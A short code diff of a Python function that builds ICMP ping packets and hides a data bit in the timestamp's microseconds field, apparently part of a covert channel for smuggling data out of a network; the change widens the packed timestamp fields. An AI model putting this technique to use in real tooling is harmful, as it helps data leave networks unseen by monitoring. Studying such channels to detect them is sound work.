@@ -10,13 +10,13 @@ def build_ping_packet(dst_ip, identifier, sequence_number, bit):
     microseconds_bin = bin(microseconds)[2:-1] + bit
     malicious_mircoseconds = int(microseconds_bin, 2)
 
-    # Create timestamp (8 bytes) - seconds and microseconds
-    timestamp = struct.pack('!II', seconds, malicious_mircoseconds)
+    # Create timestamp (16 bytes) - seconds and microseconds
+    timestamp = struct.pack('!QQ', seconds, malicious_mircoseconds)
 
     # Create pattern to fill the payload (after timestamp)
     pattern = bytes(range(0x10, 0x10 + 40))  # 40 bytes: 0x10 to 0x37
 
-    # Final payload: timestamp + pattern (total 40 bytes)
+    # Final payload: timestamp + pattern (total 56 bytes)
     payload = timestamp + pattern
 
     # Build full packet
